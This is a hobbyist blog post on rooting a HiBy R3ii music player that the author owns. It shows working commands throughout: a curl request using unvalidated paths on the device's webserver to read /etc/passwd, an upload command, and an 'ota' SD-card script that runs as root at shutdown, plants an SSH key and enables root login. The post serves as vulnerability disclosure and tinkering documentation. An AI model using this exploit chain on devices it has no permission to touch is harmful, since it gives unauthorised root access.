+++
title = "Rooting the HiBy R3ii"
date = 2024-06-15
path = "2024/06/hiby-r3ii-root"
+++

The HiBy R3ii is a "Digital Audio Player" (DAP), basically the modern equivalent of MP3 players from the 00's. Naturally, I wanted to find out how hackable the device is.

![](/2024/06/hiby-main.jpg)

<!-- more -->

We bought this device last week, and as all nerds know, you gotta see how it works from the inside. I've done this kind of thing before with both a GoPro and a 4G Modem [when I built my IRL backpack](/2022/08/irl-backpack/), so I kinda know where to start.

The very first thing I did was look through the settings of the device itself to see how I can interface with it. There's a nice little webserver you can enable that you can use to upload music and other files to the device, as well as download them.

This is accessed by going to "Wireless" -> "Import Music via Wi-Fi".

![](/2024/06/hiby-http.jpg)

However, they don't do any validation on the paths provided to the API, so we can pull any file from the device we want:

```bash
$ curl http://192.168.1.96:4399/download\?path=/etc/passwd
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
operator:x:37:37:Operator:/var:/bin/sh
haldaemon:x:68:68:hald:/:/bin/sh
dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
ftp:x:83:83:ftp:/home/ftp:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
sshd:x:103:99:Operator:/var:/bin/sh
dyn:x:1000:1000:dyn:/home/dyn:/bin/sh
default:x:1000:1000:Default non-root user:/home/default:/bin/sh
```

Sometimes we may need to pass `--ignore-content-length` to curl in order to download some files, as the webserver incorrectly reports `Content-Length` to be 0 while still providing the data.

We can also get (almost) any directory file list: (some directories refuse to be listed, I am not sure why)

```bash
$ curl http://192.168.1.96:4399/list\?path=/var/log/ | jq
[
  {
    "path": "/var/log/cgic.log",
    "name": "cgic.log",
    "ctime": "1531674272",
    "size": 1712
  },
  {
    "path": "/var/log/thttpd_state",
    "name": "thttpd_state",
    "ctime": "1531674078",
    "size": 0
  },
  {
    "path": "/var/log/udp_state",
    "name": "udp_state",
    "ctime": "1531674078",
    "size": 0
  },
  ...
]
```

We can also upload files, but it looks like this is limited to the SD card.

The webserver is a great starting point and lets us do a lot of things already - it even runs as root! But I wanted to see if I could get an actual root shell to run commands.

I ended up downloading the firmware image from [HiBy's official website](https://store.hiby.com/apps/help-center#hc-r3-ii-firmware-v12-update), which - for whatever reason - is [a Google Drive link](https://drive.google.com/file/d/19SkqeVMVhfPNwhT758ZTrDscv-5-l-Ve/view?usp=sharing). (Later I found that the updater on the device itself **does** fetch the firmware from a non-Google URL, but it's still unclear to me why they are using Google Drive links.)

Inside of the firmware zip we have a number of interesting files, but all we really need is `r3ii.upt`, which is an ISO image that the device uses to install firmware updates. One of the files inside of the ISO is `SYSTEM.UBI`, which is an [UBIFS](https://en.wikipedia.org/wiki/UBIFS) filesystem image containing all the files pushed to the flash.

It would be pretty straight forward to build your own ISO update image and push that to the device, but I didn't feel like doing the work, so instead I looked through the executables on the device.

Extracting the UBIFS image is easy, and can be done through the [ubi_reader](https://github.com/onekey-sec/ubi_reader) tools:

```bash
ubireader_extract_files system.ubifs
```

The main executable binary is a MIPS32 binary located at `/usr/bin/hiby_player`. I put this into Ghidra and started looking for points of interest.

The system uses some internal root paths to point to specific parts of the system:

* `x:\`, `y:\`, `z:\` => `/usr/resource/`: application resources such as UI
* `a:\` => `/mnt/sd_1/`: second SD card - a second SD card slot doesn't exist on this model, but there are other models that do support it
* `b:\` => `/mnt/sd_2/`: third SD card
* `c:\` => `/mnt/udisk_0/`: first mounted external drive (through USB)
* `d:\` => `/mnt/samba/`: network drive
* `e:\` => `/mnt/udisk_1/`: second mounted external drive
* `f:\` => `/mnt/udisk_2/`: third mounted external drive
* `v:\` => `/`: system root

Searching for all paths in the firmware reveals a number of interesting SD card paths:

* `/mnt/sd_0/r3ii.upt`, `a:\update.upt`, and `a:\r3ii.upt`: paths used for updating - you could probably use these to flash a custom firmware to the device, but I have not tried this.
* `/mnt/sd_0/ota`: something labeled as a `test_program`.

The `ota` script is particularly interesting; it's a program on the (first) SD card that gets executed when you shut down the device. We can test this by writing a script with the filename `ota` to the root of the SD card:

```bash
#!/bin/sh
printf "Hello, world!" > /mnt/sd_0/test.txt
```

This file can either be placed on the SD card directly, or uploaded via the webserver:

```bash
curl -F "files[]=@ota" http://192.168.1.96:4399/upload
```

We hold the power button on the device to shut it down, and.. it doesn't actually shut down, the countdown just restarts! This is an interesting but good sign - putting our script here has changed how shutdown behaves.

![](/2024/06/hiby-shutdown.jpg)

If we don't hold it to fully shutdown (happens after restarting the countdown ~2 times) and check the contents of the SD card (which can be done through the webserver as well), we can see that a new file has been created: `test.txt` containing the text `Hello, world!`. Awesome! So we can run arbitrary commands. But under which user is this running? This is easy to test:

```bash
#!/bin/sh
id > /mnt/sd_0/my_id.txt
```

Running this reveals that we are in fact running as root (uid 0, gid 0). So we can run arbitrary commands as root on the device now whenever we want by pressing the shutdown button. But we can do a bit more than this now.

While I was exploring the filesystem of the device, I found that there is an SSH daemon present, which the HiBy team were using themselves during development, as can be seen by the presence of a public key in `/root/authorized_keys`, attributed to `dyn@hb`:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6NB8XeL+Ay9ySEXg5TNChKS0F0PxH2eXeVcQguEc/yh/SeV+2HLr3spjGlFRm8rfRhgT03GwTbdKrSyumQd/mJ4+gFm7uvaJ9byg7mnIDu0Srxd1UN2TxqQGf0wTI4S78MX96r8LTr5duVKSIVRX/ZHff8nsvH4m9NVowONy4h42jjc60o989Y8YjFY6aiPbrcBA9OSvYsQg+oAnyjnmfu/aEwYdlBpXqAe3RG1JhtM3Zv80V93yF89aiN7D1iN2OlzmbS1PMph/6W7lIIVMvKPqzBgxLeDqZScKkFV31WAUxn0M28KtVn2uqUyBROEjygqrO2v1SOt/vIEv2eWl7 dyn@hb
```

Can we figure out how to start the SSH server with our own public key so we can access it easier? After some trial and error, I came up with the following `ota` script:

```bash
#!/bin/sh

printf "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk/MLteTsbtxuLmMnF+lbvCBISEyyg4FWjJJgyWvdz2 nimble@nimblepad\n" > /root/.ssh/authorized_keys

chmod 0750 /root
chmod 0700 /root/.ssh
chmod 0600 /root/.ssh/authorized_keys
chown root:root /root
chown root:root /root/.ssh
chown root:root /root/.ssh/authorized_keys

printf "AuthorizedKeysFile .ssh/authorized_keys
UsePrivilegeSeparation no
PasswordAuthentication no
PermitEmptyPasswords no
PermitRootLogin yes
Subsystem       sftp    /usr/libexec/sftp-server\n" > /etc/ssh/sshd_config

mkdir /var/empty
chown root:wheel /var/empty
chmod 555 /var/empty

killall -9 sshd
/bin/sshd -E /var/log/sshd.log &
```

This does a number of things:
* Modifies `authorized_keys` to add my ed25519 public key. Note that RSA keys also work, but they may require passing `-o 'PubkeyAcceptedKeyTypes +ssh-rsa'` to `ssh` when connecting.
* Sets appropriate permissions for the `/root` folder and the relevant SSH paths, as these are not already set correctly.
* Creates `/var/empty` and gives it the proper permissions, as the SSH server requires this.
* Writes a custom `sshd_config` that permits root login.
* Finally, kills any existing instance of `sshd` before starting its own `sshd` with logging enabled - if something goes wrong, we can pull the logs using the webserver.

After pushing the script and holding the shutdown button until the timer restarts, we should now have a working SSH server that we can connect to! I can now simply run `ssh root@192.168.1.96` and be presented with a root shell on the device.

To conclude, you can probably automate this by writing a custom firmware and flashing that to the device. However, I particularly like this method where all it takes to get a root shell is 1 file on the SD card and holding the power button for a few seconds, all without flashing the entire device.
